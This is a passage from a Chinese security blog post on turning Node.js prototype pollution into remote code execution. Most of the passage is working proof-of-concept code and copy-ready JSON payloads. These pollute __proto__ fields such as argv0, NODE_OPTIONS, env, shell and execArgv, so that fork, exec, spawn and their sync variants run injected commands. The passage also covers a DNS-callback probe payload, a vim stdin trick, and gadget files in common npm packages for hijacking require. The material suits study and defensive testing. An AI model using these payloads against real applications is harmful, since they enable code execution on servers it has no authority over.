+<p>不过这时候由于 argv0 被修改了，导致无法生成进程，因为它不是有效的命令或文件路径，这点我们可以指定 shell 参数来绕过，只要设置为一个可执行文件的路径，这样执行命令时就会把shell参数附加到命令及其参数的前面，如<code>/bin/myshell -c &quot;command arg1 arg2 arg3&quot;</code>，这里无脑用<code>/proc/self/exe</code>即可</p>
+<p>到时候执行的节点进程大致如下：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">execve<span class="token punctuation">(</span><span class="token string">"/proc/self/exe"</span>, <span class="token punctuation">[</span><span class="token string">"console.log('pwned!');//"</span>, <span class="token string">"-c"</span>, <span class="token string">"node …"</span><span class="token punctuation">]</span>, <span class="token punctuation">&#123;</span> NODE_OPTIONS: <span class="token string">"--require /proc/self/cmdline"</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>此时 argv0 即这里的<code>console.log(&#39;pwned!&#39;);//</code></p>
+<p>poc：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> <span class="token punctuation">&#123;</span> execSync<span class="token punctuation">,</span> fork <span class="token punctuation">&#125;</span> <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'child_process'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token comment">// Manual Pollution</span>
+b <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
+
+<span class="token comment">// 实测shell参数可以不改，不知道为什么</span>
+<span class="token comment">// b.__proto__.shell = "/proc/self/exe"</span>
+b<span class="token punctuation">.</span>__proto__<span class="token punctuation">.</span>argv0 <span class="token operator">=</span> <span class="token string">"console.log(require('child_process').execSync('cat /proc/self/cmdline>pp2rce.txt').toString())//"</span>
+b<span class="token punctuation">.</span>__proto__<span class="token punctuation">.</span><span class="token constant">NODE_OPTIONS</span> <span class="token operator">=</span> <span class="token string">"--require /proc/self/cmdline"</span>
+
+<span class="token comment">// Trigger gadget</span>
+<span class="token keyword">var</span> proc <span class="token operator">=</span> <span class="token function">fork</span><span class="token punctuation">(</span><span class="token string">'./evil.js'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token comment">// This should create the file pp2rce.txt</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>json速抄：</p>
+<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"__proto__"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token property">"NODE_OPTIONS"</span><span class="token operator">:</span> <span class="token string">"--require /proc/self/cmdline"</span><span class="token punctuation">,</span> <span class="token property">"argv0"</span><span class="token operator">:</span> <span class="token string">"console.log(require(\\\"child_process\\\").execSync(\\\"touch /tmp/pp2rce2\\\").toString())//"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<hr>
+<h2 id="DNS探测"><a href="#DNS探测" class="headerlink" title="DNS探测"></a>DNS探测</h2><p><code>--inspect</code>是用来指定调试器url的，如<code>NODE_OPTIONS=&#39;--inspect=localhost:4444&#39;</code></p>
+<p>甚至可以指定一个dns服务器</p>
+<p><img src="/blog/2024/10/11/PP2RCE/image-20241012172457197.png" alt="image-20241012172457197"></p>
+<p><img src="/blog/2024/10/11/PP2RCE/image-20241012172509331.png" alt="image-20241012172509331"></p>
+<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
+<span class="token property">"__proto__"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
+<span class="token property">"argv0"</span><span class="token operator">:</span><span class="token string">"node"</span><span class="token punctuation">,</span>
+<span class="token property">"shell"</span><span class="token operator">:</span><span class="token string">"node"</span><span class="token punctuation">,</span>
+<span class="token property">"NODE_OPTIONS"</span><span class="token operator">:</span><span class="token string">"--inspect=id\"\".oastify\"\".com"</span>
+<span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<hr>
+<h1 id="上述两种方法延伸出child-process-下其它函数利用"><a href="#上述两种方法延伸出child-process-下其它函数利用" class="headerlink" title="上述两种方法延伸出child_process 下其它函数利用"></a>上述两种方法延伸出child_process 下其它函数利用</h1><p>node v18.4.0后，options 的默认值为 kEmptyObject 而不是 <code>&#123;&#125;</code>，对<code>spawn</code> 和 <code>spawnSync</code>有影响</p>
+<h2 id="exec"><a href="#exec" class="headerlink" title="exec"></a>exec</h2><p>不能污染<code>.env</code>，因为此时 options.env 的值为 null</p>
+<p>污染cmdline：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// cmdline trick - working with small variation</span>
+<span class="token comment">// Working after kEmptyObject (fix)</span>
+<span class="token keyword">const</span> <span class="token punctuation">&#123;</span> exec <span class="token punctuation">&#125;</span> <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'child_process'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+p <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
+p<span class="token punctuation">.</span>__proto__<span class="token punctuation">.</span>shell <span class="token operator">=</span> <span class="token string">"/proc/self/exe"</span> <span class="token comment">//You need to make sure the node executable is executed</span>
+p<span class="token punctuation">.</span>__proto__<span class="token punctuation">.</span>argv0 <span class="token operator">=</span> <span class="token string">"console.log(require('child_process').execSync('whoami>pp2rce.txt').toString())//"</span>
+p<span class="token punctuation">.</span>__proto__<span class="token punctuation">.</span><span class="token constant">NODE_OPTIONS</span> <span class="token operator">=</span> <span class="token string">"--require /proc/self/cmdline"</span>
+<span class="token keyword">var</span> proc <span class="token operator">=</span> <span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">'something'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>windows下（后面windows都差不多就不重复copy了）：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> <span class="token punctuation">&#123;</span> exec <span class="token punctuation">&#125;</span> <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'child_process'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+p <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
+p<span class="token punctuation">.</span>__proto__<span class="token punctuation">.</span>shell <span class="token operator">=</span> <span class="token string">"\\\\127.0.0.1\\C$\\Windows\\System32\\calc.exe"</span>
+<span class="token keyword">var</span> proc <span class="token operator">=</span> <span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">'something'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<hr>
+<h2 id="execFile"><a href="#execFile" class="headerlink" title="execFile"></a>execFile</h2><p>env：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// environ trick - working</span>
+<span class="token comment">// Working after kEmptyObject (fix)</span>
+<span class="token keyword">const</span> <span class="token punctuation">&#123;</span> fork <span class="token punctuation">&#125;</span> <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'child_process'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+b <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
+b<span class="token punctuation">.</span>__proto__<span class="token punctuation">.</span>env <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token string-property property">"EVIL"</span><span class="token operator">:</span><span class="token string">"console.log(require('child_process').execSync('touch /tmp/fork-environ').toString())//"</span><span class="token punctuation">&#125;</span>
+b<span class="token punctuation">.</span>__proto__<span class="token punctuation">.</span><span class="token constant">NODE_OPTIONS</span> <span class="token operator">=</span> <span class="token string">"--require /proc/self/environ"</span>
+<span class="token keyword">var</span> proc <span class="token operator">=</span> <span class="token function">fork</span><span class="token punctuation">(</span><span class="token string">'something'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>cmdline：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// cmdline trick - working</span>
+<span class="token comment">// Working after kEmptyObject (fix)</span>
+<span class="token keyword">const</span> <span class="token punctuation">&#123;</span> fork <span class="token punctuation">&#125;</span> <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'child_process'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+p <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
+p<span class="token punctuation">.</span>__proto__<span class="token punctuation">.</span>argv0 <span class="token operator">=</span> <span class="token string">"console.log(require('child_process').execSync('touch /tmp/fork-cmdline').toString())//"</span>
+p<span class="token punctuation">.</span>__proto__<span class="token punctuation">.</span><span class="token constant">NODE_OPTIONS</span> <span class="token operator">=</span> <span class="token string">"--require /proc/self/cmdline"</span>
+<span class="token keyword">var</span> proc <span class="token operator">=</span> <span class="token function">fork</span><span class="token punctuation">(</span><span class="token string">'something'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>还有直接控制 execArgv 参数来命令执行的：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// execArgv trick - working</span>
+<span class="token comment">// Only the fork method has this attribute</span>
+<span class="token comment">// Working after kEmptyObject (fix)</span>
+<span class="token keyword">const</span> <span class="token punctuation">&#123;</span> fork <span class="token punctuation">&#125;</span> <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'child_process'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+b <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
+b<span class="token punctuation">.</span>__proto__<span class="token punctuation">.</span>execPath <span class="token operator">=</span> <span class="token string">"/bin/sh"</span>
+b<span class="token punctuation">.</span>__proto__<span class="token punctuation">.</span>argv0 <span class="token operator">=</span> <span class="token string">"/bin/sh"</span>
+b<span class="token punctuation">.</span>__proto__<span class="token punctuation">.</span>execArgv <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"-c"</span><span class="token punctuation">,</span> <span class="token string">"touch /tmp/fork-execArgv"</span><span class="token punctuation">]</span>
+<span class="token keyword">var</span> proc <span class="token operator">=</span> <span class="token function">fork</span><span class="token punctuation">(</span><span class="token string">'./a_file.js'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<hr>
+<h2 id="spawn"><a href="#spawn" class="headerlink" title="spawn"></a>spawn</h2><p>污染env：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// environ trick - working with small variation (shell and argv0)</span>
+<span class="token comment">// NOT working after kEmptyObject (fix) without options</span>
+<span class="token keyword">const</span> <span class="token punctuation">&#123;</span> spawn <span class="token punctuation">&#125;</span> <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'child_process'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+p <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
+<span class="token comment">// If in windows or mac you need to change the following params to the path of ndoe</span>
+p<span class="token punctuation">.</span>__proto__<span class="token punctuation">.</span>argv0 <span class="token operator">=</span> <span class="token string">"/proc/self/exe"</span> <span class="token comment">//You need to make sure the node executable is executed</span>
+p<span class="token punctuation">.</span>__proto__<span class="token punctuation">.</span>shell <span class="token operator">=</span> <span class="token string">"/proc/self/exe"</span> <span class="token comment">//You need to make sure the node executable is executed</span>
+p<span class="token punctuation">.</span>__proto__<span class="token punctuation">.</span>env <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token string-property property">"EVIL"</span><span class="token operator">:</span><span class="token string">"console.log(require('child_process').execSync('whoami>pp2rce.txt').toString())//"</span><span class="token punctuation">&#125;</span>
+p<span class="token punctuation">.</span>__proto__<span class="token punctuation">.</span><span class="token constant">NODE_OPTIONS</span> <span class="token operator">=</span> <span class="token string">"--require /proc/self/environ"</span>
+<span class="token keyword">var</span> proc <span class="token operator">=</span> <span class="token function">spawn</span><span class="token punctuation">(</span><span class="token string">'something'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>污染cmdline：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// cmdline trick - working with small variation (shell)</span>
+<span class="token comment">// NOT working after kEmptyObject (fix) without options</span>
+<span class="token keyword">const</span> <span class="token punctuation">&#123;</span> spawn <span class="token punctuation">&#125;</span> <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'child_process'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+p <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
+p<span class="token punctuation">.</span>__proto__<span class="token punctuation">.</span>shell <span class="token operator">=</span> <span class="token string">"/proc/self/exe"</span> <span class="token comment">//You need to make sure the node executable is executed</span>
+p<span class="token punctuation">.</span>__proto__<span class="token punctuation">.</span>argv0 <span class="token operator">=</span> <span class="token string">"console.log(require('child_process').execSync('touch /tmp/spawn-cmdline').toString())//"</span>
+p<span class="token punctuation">.</span>__proto__<span class="token punctuation">.</span><span class="token constant">NODE_OPTIONS</span> <span class="token operator">=</span> <span class="token string">"--require /proc/self/cmdline"</span>
+<span class="token keyword">var</span> proc <span class="token operator">=</span> <span class="token function">spawn</span><span class="token punctuation">(</span><span class="token string">'something'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token comment">//var proc = spawn('something',[],&#123;"cwd":"/tmp"&#125;); //To work after kEmptyObject (fix)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<hr>
+<h2 id="execFileSync"><a href="#execFileSync" class="headerlink" title="execFileSync"></a>execFileSync</h2><p>env：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// environ trick - working with small variation (shell and argv0)</span>
+<span class="token comment">// Working after kEmptyObject (fix)</span>
+<span class="token keyword">const</span> <span class="token punctuation">&#123;</span> execFileSync <span class="token punctuation">&#125;</span> <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'child_process'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+p <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
+<span class="token comment">// If in windows or mac you need to change the following params to the path of ndoe</span>
+p<span class="token punctuation">.</span>__proto__<span class="token punctuation">.</span>argv0 <span class="token operator">=</span> <span class="token string">"/proc/self/exe"</span> <span class="token comment">//You need to make sure the node executable is executed</span>
+p<span class="token punctuation">.</span>__proto__<span class="token punctuation">.</span>shell <span class="token operator">=</span> <span class="token string">"/proc/self/exe"</span> <span class="token comment">//You need to make sure the node executable is executed</span>
+p<span class="token punctuation">.</span>__proto__<span class="token punctuation">.</span>env <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token string-property property">"EVIL"</span><span class="token operator">:</span><span class="token string">"console.log(require('child_process').execSync('touch /tmp/execFileSync-environ').toString())//"</span><span class="token punctuation">&#125;</span>
+p<span class="token punctuation">.</span>__proto__<span class="token punctuation">.</span><span class="token constant">NODE_OPTIONS</span> <span class="token operator">=</span> <span class="token string">"--require /proc/self/environ"</span>
+<span class="token keyword">var</span> proc <span class="token operator">=</span> <span class="token function">execFileSync</span><span class="token punctuation">(</span><span class="token string">'something'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>cmdline：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// cmdline trick - working with small variation (shell)</span>
+<span class="token comment">// Working after kEmptyObject (fix)</span>
+<span class="token keyword">const</span> <span class="token punctuation">&#123;</span> execFileSync <span class="token punctuation">&#125;</span> <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'child_process'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+p <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
+p<span class="token punctuation">.</span>__proto__<span class="token punctuation">.</span>shell <span class="token operator">=</span> <span class="token string">"/proc/self/exe"</span> <span class="token comment">//You need to make sure the node executable is executed</span>
+p<span class="token punctuation">.</span>__proto__<span class="token punctuation">.</span>argv0 <span class="token operator">=</span> <span class="token string">"console.log(require('child_process').execSync('touch /tmp/execFileSync-cmdline').toString())//"</span>
+p<span class="token punctuation">.</span>__proto__<span class="token punctuation">.</span><span class="token constant">NODE_OPTIONS</span> <span class="token operator">=</span> <span class="token string">"--require /proc/self/cmdline"</span>
+<span class="token keyword">var</span> proc <span class="token operator">=</span> <span class="token function">execFileSync</span><span class="token punctuation">(</span><span class="token string">'something'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>stdin，居然可以直接调用 vim 写入文件：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// stdin trick - working</span>
+<span class="token comment">// Working after kEmptyObject (fix)</span>
+<span class="token keyword">const</span> <span class="token punctuation">&#123;</span> execFileSync <span class="token punctuation">&#125;</span> <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'child_process'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+p <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
+p<span class="token punctuation">.</span>__proto__<span class="token punctuation">.</span>argv0 <span class="token operator">=</span> <span class="token string">"/usr/bin/vim"</span>
+p<span class="token punctuation">.</span>__proto__<span class="token punctuation">.</span>shell <span class="token operator">=</span> <span class="token string">"/usr/bin/vim"</span>
+p<span class="token punctuation">.</span>__proto__<span class="token punctuation">.</span>input <span class="token operator">=</span> <span class="token string">':!&#123;touch /tmp/execFileSync-stdin&#125;\n'</span>
+<span class="token keyword">var</span> proc <span class="token operator">=</span> <span class="token function">execFileSync</span><span class="token punctuation">(</span><span class="token string">'something'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<hr>
+<h2 id="execSync"><a href="#execSync" class="headerlink" title="execSync"></a>execSync</h2><p>和execFileSync一样，只是换了函数而已</p>
+<hr>
+<h2 id="spawnSync"><a href="#spawnSync" class="headerlink" title="spawnSync"></a>spawnSync</h2><p>同上</p>
+<hr>
+<h1 id="主动调用spawn"><a href="#主动调用spawn" class="headerlink" title="主动调用spawn"></a>主动调用spawn</h1><p>前面的操作都是基于代码中调用了<code>spawn</code>的功能，如果代码没有调用它但是存在 require 的话，我们可以尝试通过原型链污染来包含依赖中调用了 spawn 的 js 文件</p>
+<p>一些常见的文件：</p>
+<ul>
+<li><p>&#x2F;path&#x2F;to&#x2F;npm&#x2F;scripts&#x2F;changelog.js</p>
+</li>
+<li><p>&#x2F;opt&#x2F;yarn-v1.22.19&#x2F;preinstall.js</p>
+</li>
+<li><p>node_modules&#x2F;buffer&#x2F;bin&#x2F;<strong>download-node-tests.js</strong>:17</p>
+<p><code>cp.execSync(&#39;rm -rf node/*.js&#39;, &#123; cwd: path.join(__dirname, &#39;../test&#39;) &#125;)</code></p>
+</li>
+<li><p>node_modules&#x2F;buffer&#x2F;bin&#x2F;<strong>test.js</strong>:10</p>
+<p><code>var node = cp.spawn(&#39;npm&#39;, [&#39;run&#39;, &#39;test-node&#39;], &#123; stdio: &#39;inherit&#39; &#125;)</code></p>
+</li>
+<li><p>node_modules&#x2F;npm&#x2F;scripts&#x2F;<strong>changelog.js</strong>:16</p>
+<p><code>const log = execSync(git log --reverse --pretty=&#39;format:%h %H%d %s (%aN)%n%b%n---%n&#39; $&#123;branch&#125;...).toString().split(/\n/)</code></p>
+</li>
+<li><p>node_modules&#x2F;detect-libc&#x2F;bin&#x2F;<strong>detect-libc.js</strong>:18</p>
+<p><code>process.exit(spawnSync(process.argv[2], process.argv.slice(3), spawnOptions).status);</code></p>
+</li>
+<li><p>node_modules&#x2F;jest-expo&#x2F;bin&#x2F;<strong>jest.js</strong>:26</p>
+<p><code>const result = childProcess.spawnSync(&#39;node&#39;, jestWithArgs, &#123; stdio: &#39;inherit&#39; &#125;);</code></p>
+</li>
+<li><p>node_modules&#x2F;buffer&#x2F;bin&#x2F;<strong>download-node-tests.js</strong>:17</p>
+<p><code>cp.execSync(&#39;rm -rf node/*.js&#39;, &#123; cwd: path.join(__dirname, &#39;../test&#39;) &#125;)</code></p>
+</li>
+<li><p>node_modules&#x2F;buffer&#x2F;bin&#x2F;<strong>test.js</strong>:10</p>
+<p><code>var node = cp.spawn(&#39;npm&#39;, [&#39;run&#39;, &#39;test-node&#39;], &#123; stdio: &#39;inherit&#39; &#125;)</code></p>
+</li>
+<li><p>node_modules&#x2F;runtypes&#x2F;scripts&#x2F;<strong>format.js</strong>:13</p>
+<p><code>const npmBinPath = execSync(&#39;npm bin&#39;).toString().trim();</code></p>
+</li>
+<li><p>node_modules&#x2F;node-pty&#x2F;scripts&#x2F;<strong>publish.js</strong>:31</p>
+<p><code>const result = cp.spawn(&#39;npm&#39;, args, &#123; stdio: &#39;inherit&#39; &#125;);</code></p>
+</li>
+</ul>
+<hr>
+<h2 id="原型链污染设置-require-路径"><a href="#原型链污染设置-require-路径" class="headerlink" title="原型链污染设置 require 路径"></a>原型链污染设置 require 路径</h2><p>这一部分我都复现失败了，不知道为什么，node版本v18.14.0和v10.19.0</p>
+<h3 id="绝对require"><a href="#绝对require" class="headerlink" title="绝对require"></a>绝对require</h3><p>如果执行的 require 是<strong>绝对的</strong>（<code>require(&quot;bytes&quot;)</code>），并且这个包在 package.json 文件中不包含 main，可以直接污染 main 属性并使 require 执行不同的文件</p>
+<blockquote>
+<p>main字段：定义了 <code>npm</code> 包的入口文件，比如说 npm 包 test 下有 lib&#x2F;index.js 作为入口文件，那么 package.json 中的写法就是<code> &quot;main&quot;: &quot;lib/index.js&quot;</code></p>
+</blockquote>
+<p>exp：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// Create a file called malicious.js in /tmp</span>
+<span class="token comment">// Contents of malicious.js in the other tab</span>
+
+<span class="token comment">// Install package bytes (it doesn't have a main in package.json)</span>
+<span class="token comment">// npm install bytes</span>
+
+<span class="token comment">// Manual Pollution</span>
+b <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
+b<span class="token punctuation">.</span>__proto__<span class="token punctuation">.</span>main <span class="token operator">=</span> <span class="token string">"/tmp/malicious.js"</span>
+
+<span class="token comment">// Trigger gadget</span>
+<span class="token keyword">var</span> proc <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'bytes'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token comment">// This should execute the file /tmp/malicious.js</span>
+<span class="token comment">// The relative path doesn't even need to exist</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>malicious.js</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> <span class="token punctuation">&#123;</span> fork <span class="token punctuation">&#125;</span> <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'child_process'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"Hellooo from malicious"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">fork</span><span class="token punctuation">(</span><span class="token string">"anything"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>json速抄：</p>
+<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"__proto__"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token property">"main"</span><span class="token operator">:</span> <span class="token string">"/tmp/malicious.js"</span><span class="token punctuation">,</span> <span class="token property">"NODE_OPTIONS"</span><span class="token operator">:</span> <span class="token string">"--require /proc/self/cmdline"</span><span class="token punctuation">,</span> <span class="token property">"argv0"</span><span class="token operator">:</span> <span class="token string">"console.log(require(\\\"child_process\\\").execSync(\\\"touch /tmp/pp2rce_absolute\\\").toString())//"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<hr>
+<h3 id="相对require"><a href="#相对require" class="headerlink" title="相对require"></a>相对require</h3><p>如果加载的是相对路径而不是绝对路径，可以使节点加载不同的路径：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// Create a file called malicious.js in /tmp</span>
+<span class="token comment">// Contents of malicious.js in the other tab</span>
+
+<span class="token comment">// Manual Pollution</span>
+b <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
+b<span class="token punctuation">.</span>__proto__<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token string-property property">"."</span><span class="token operator">:</span> <span class="token string">"./malicious.js"</span> <span class="token punctuation">&#125;</span>
+b<span class="token punctuation">.</span>__proto__<span class="token punctuation">[</span><span class="token string">"1"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"/tmp"</span>
+
+<span class="token comment">// Trigger gadget</span>
+<span class="token keyword">var</span> proc <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'./relative_path.js'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token comment">// This should execute the file /tmp/malicious.js</span>
+<span class="token comment">// The relative path doesn't even need to exist</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>法2：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// Create a file called malicious.js in /tmp</span>
+<span class="token comment">// Contents of malicious.js in the other tab</span>
+
+<span class="token comment">// Manual Pollution</span>
+b <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
+b<span class="token punctuation">.</span>__proto__<span class="token punctuation">.</span>data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
+b<span class="token punctuation">.</span>__proto__<span class="token punctuation">.</span>data<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token string-property property">"."</span><span class="token operator">:</span> <span class="token string">"./malicious.js"</span> <span class="token punctuation">&#125;</span>
+b<span class="token punctuation">.</span>__proto__<span class="token punctuation">.</span>path <span class="token operator">=</span> <span class="token string">"/tmp"</span>
+b<span class="token punctuation">.</span>__proto__<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">"./relative_path.js"</span> <span class="token comment">//This needs to be the relative path that will be imported in the require</span>
+
+<span class="token comment">// Trigger gadget</span>
+<span class="token keyword">var</span> proc <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'./relative_path.js'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token comment">// This should execute the file /tmp/malicious.js</span>
+<span class="token comment">// The relative path doesn't even need to exist</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>法3：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// Requiring /opt/yarn-v1.22.19/preinstall.js</span>
+<span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">[</span><span class="token string">"data"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+<span class="token literal-property property">exports</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
+<span class="token string-property property">"."</span><span class="token operator">:</span> <span class="token string">"./preinstall.js"</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+<span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'./usage'</span>
+<span class="token punctuation">&#125;</span>
